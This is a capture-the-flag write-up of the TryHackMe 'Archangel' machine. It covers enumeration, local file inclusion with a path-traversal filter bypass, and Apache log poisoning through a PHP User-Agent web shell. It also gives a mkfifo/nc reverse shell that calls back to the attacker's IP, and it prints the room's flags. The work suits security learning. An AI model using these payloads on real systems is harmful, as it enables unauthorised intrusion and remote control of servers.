---
Boot2root, Web exploitation, Privilege escalation, LFI
---

# Archangel — Writeup

## Overview
### Archangel — Writeup
### Archangel — Writeup
![](https://tryhackme-images.s3.amazonaws.com/room-icons/915282ea9193c331ef451c1a1d4e0b1b.jpeg)

## Enumeration
```text
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A 10.10.175.186     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-25 11:48 EDT
Nmap scan report for 10.10.175.186
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wavefire
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/25%OT=22%CT=1%CU=41213%PV=Y%DS=2%DC=T%G=Y%TM=6330787
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=FC%GCD=1%ISR=10F%TI=Z%CI=Z%TS=A)OPS(O1=M506ST11NW6%O2=M506ST11NW6%O3=
OS:M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11NW6%O6=M506ST11)WIN(W1=F4B3%W2=F4
OS:B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW6
OS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=
OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIP
OS:CK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   188.19 ms 10.18.0.1
2   264.01 ms 10.10.175.186

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.18 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A 10.10.175.186
```
```text
┌──(kali㉿kali)-[~]
└─$ feroxbuster --url http://10.10.175.186 -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.175.186
 🚀  Threads               │ 60
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      320l     1270w    19188c http://10.10.175.186/
301      GET        9l       28w      314c http://10.10.175.186/flags => http://10.10.175.186/flags/
```

## Exploitation
```text
┌──(kali㉿kali)-[~]
└─$ curl -s http://10.10.175.186 | grep ".thm"  
          <div class="block clear"><a href="#"><i class="fas fa-envelope"></i></a> <span><strong>Send us a mail:</strong> support@mafialive.thm</span></div>

adding domain to /etc/hosts
```
```text
┌──(kali㉿kali)-[~]
└─$ echo "10.10.175.186 mafialive.thm" | sudo tee -a /etc/hosts
10.10.175.186 mafialive.thm

http://mafialive.thm/robots.txt

User-agent: *
Disallow: /test.php

http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php

    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        Control is an illusion    </div>

 using php://filter allows to bypass the protection and we are able to encode the file as a base64 string: 

php://filter/convert.base64-encode/resource=
test.php

http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php

<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

	    //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
    </div>
</body>

</html>
```
Enumerate the machine
Find a different hostname
*mafialive.thm*
![[Pasted image 20220925105914.png]]
Find flag 1
Look for a page under development
FUZZ!!
*test.php*
Find flag 2
Best way to exploit lfi is to look at the code
```text
The code is checking that the 2 below conditions are met about the injected content:

    it should not contain ../..
    it should contain /var/www/html/development_testing

We can bypass the path traversal protection by replacing ../.. with .././.., as follows: 

http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log

10.18.1.77 - - [25/Sep/2022:21:18:45 +0530] "GET / HTTP/1.0" 200 19462 "-" "-" 10.18.1.77 - - [25/Sep/2022:21:19:03 +0530] "GET / HTTP/1.1" 200 3888 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:03 +0530] "GET / HTTP/1.0" 200 19462 "-" "-" 10.18.1.77 - - [25/Sep/2022:21:19:03 +0530] "GET /nmaplowercheck1664120943 HTTP/1.1" 404 455 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:03 +0530] "PROPFIND / HTTP/1.1" 405 523 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:03 +0530] "POST / HTTP/1.1" 200 19462 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "GET / HTTP/1.1" 200 19462 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "GET /robots.txt HTTP/1.1" 404 455 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "GET /layout/styles/layout.css HTTP/1.1" 200 4953 "http://10.10.175.186/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "POST /sdk HTTP/1.1" 404 455 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "GET /.git/HEAD HTTP/1.1" 404 455 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "PROPFIND / HTTP/1.1" 405 523 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "GET /images/demo/348x261.png HTTP/1.1" 200 3162 "http://10.10.175.186/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "GET /evox/about HTTP/1.1" 404 455 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "GET /layout/scripts/jquery.backtotop.js HTTP/1.1" 200 693 "http://10.10.175.186/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "GET /layout/scripts/jquery.mobilemenu.js HTTP/1.1" 200 926 "http://10.10.175.186/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "GET /layout/styles/fontawesome-free/css/fontawesome-all.min.css HTTP/1.1" 200 8451 "http://10.10.175.186/layout/styles/layout.css" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "PROPFIND / HTTP/1.1" 405 523 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "GET /layout/scripts/jquery.min.js HTTP/1.1" 200 30663 "http://10.10.175.186/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "GET /HNAP1 HTTP/1.1" 404 455 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET /layout/styles/framework.css HTTP/1.1" 200 2178 "http://10.10.175.186/layout/styles/layout.css" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET /images/demo/100x100.png HTTP/1.1" 200 1543 "http://10.10.175.186/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "PPRL / HTTP/1.1" 501 499 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET /images/demo/348x420.png HTTP/1.1" 200 3799 "http://10.10.175.186/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET /favicon.ico HTTP/1.1" 404 455 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET / HTTP/1.1" 200 19462 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET /images/demo/backgrounds/01.png HTTP/1.1" 200 21142 "http://10.10.175.186/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET /layout/scripts/jquery.backtotop.js HTTP/1.1" 200 693 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET /layout/styles/fontawesome-free/webfonts/fa-solid-900.woff2 HTTP/1.1" 200 44266 "http://10.10.175.186/layout/styles/fontawesome-free/css/fontawesome-all.min.css" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET /layout/styles/fontawesome-free/webfonts/fa-brands-400.woff2 HTTP/1.1" 200 54946 "http://10.10.175.186/layout/styles/fontawesome-free/css/fontawesome-all.min.css" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET /favicon.ico HTTP/1.1" 404 491 "http://10.10.175.186/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:06 +0530] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET /layout/scripts/jquery.mobilemenu.js HTTP/1.1" 200 926 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET /layout/scripts/jquery.min.js HTTP/1.1" 200 30663 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:06 +0530] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:07 +0530] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:07 +0530] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" ::1 - - [25/Sep/2022:21:19:07 +0530] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)" 10.18.1.77 - - [25/Sep/2022:21:19:08 +0530] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:08 +0530] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:09 +0530] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" ::1 - - [25/Sep/2022:21:19:10 +0530] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)" ::1 - - [25/Sep/2022:21:19:11 +0530] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)" ::1 - - [25/Sep/2022:21:19:12 +0530] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)" 10.18.1.77 - - [25/Sep/2022:21:19:12 +0530] "GET / HTTP/1.0" 200 19462 "-" "-" 10.18.1.77 - - [25/Sep/2022:21:19:13 +0530] "GET / HTTP/1.1" 200 19443 "-" "-" ::1 - - [25/Sep/2022:21:19:13 +0530] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)" ::1 - - [25/Sep/2022:21:19:14 +0530] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)" ::1 - - [25/Sep/2022:21:19:15 +0530] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)" ::1 - - [25/Sep/2022:21:19:16 +0530] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)" ::1 - - [25/Sep/2022:21:19:17 +0530] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)" ::1 - - [25/Sep/2022:21:19:18 +0530] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)" 10.18.1.77 - - [25/Sep/2022:21:19:30 +0530] "POST / HTTP/1.1" 200 3888 "http://10.10.175.186/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:35 +0530] "POST / HTTP/1.1" 200 3887 "http://10.10.175.186/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:22:02 +0530] "GET / HTTP/1.1" 200 19443 "-" "feroxbuster/2.7.0" 10.18.1.77 - - [25/Sep/2022:21:22:03 +0530] "GET /e12107a0a4e0402f87e25cd1443ab901 HTTP/1.1" 404 436 "-" "feroxbuster/2.7.0" 10.18.1.77 - - [25/Sep/2022:21:22:03 +0530] "GET / HTTP/1.1" 200 19443 "-" "feroxbuster/2.7.0" 10.18.1.77 - - [25/Sep/2022:21:22:04 +0530] "GET /.bash_history HTTP/1.1" 404 436 "-" "feroxbuster/2.7.0" 10.18.1.77 - - [25/Sep/2022:21:22:04 +0530] "GET /.cache HTTP/1.1" 404 436 "-" "feroxbuster/2.7.0" 10.18.1.77 - - [25/Sep/2022:21:22:04 +0530] "GET / HTTP/1.1" 

We’ll now poison the apache2 log file by injecting a PHP payload in the user-agent string as follows: 

some problem ocurred internal 500 server loading a new machine
```
```text
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.113.254   magician
10.10.121.237   git.git-and-crumpets.thm
10.10.149.10    hipflasks.thm hipper.hipflasks.thm
10.10.91.93     raz0rblack raz0rblack.thm
10.10.234.77    lab.enterprise.thm
10.10.96.58     source
10.10.59.104    CONTROLLER.local
10.10.54.75     acmeitsupport.thm
10.10.102.33    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm
10.10.179.221   development.smag.thm
10.10.87.241    mafialive.thm
```
```text
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log

10.18.1.77 - - [25/Sep/2022:22:20:30 +0530] "GET /test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:22:20:32 +0530] "GET /test.php?view=/var/www/html/development_testing/mrrobot.php HTTP/1.1" 200 485 "http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 

revshell
```
```text
┌──(kali㉿kali)-[~]
└─$ cat shell.php                               
<?php
        system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.18.1.77 4444 >/tmp/f");
?>
```
```text
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
```text
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444

using burpsuite

do intercept to this

forward , forward

GET /test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log&cmd=wget%20http://10.18.1.77:8000/shell.php HTTP/1.1
Host: mafialive.thm
User-Agent: <?php system($_GET['cmd']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

then visit mafialive.thm/shell.php

nice :)
```
```text
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.87.241.
Ncat: Connection from 10.10.87.241:38652.
bash: cannot set terminal process group (394): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/development_testing$ 

www-data@ubuntu:/var/www/html/development_testing$ python3 -c "import pty;pty.spawn('/bin/bash')"
<ing$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@ubuntu:/var/www/html/development_testing$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/var/www/html/development_testing$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
archangel
www-data@ubuntu:/home$ cd archangel
cd archangel
www-data@ubuntu:/home/archangel$ ls
ls
myfiles  secret  user.txt
www-data@ubuntu:/home/archangel$ cat user.txt
cat user.txt
thm{lf1_t0_rc3_1s_tr1cky}

www-data@ubuntu:/home/archangel$ cat /etc/crontab
cat /etc/crontab
```
```text
# /etc/crontab: system-wide crontab
```
```text
# Unlike any other crontab you don't have to run the `crontab'
```
```text
# command to install the new version when you edit this file
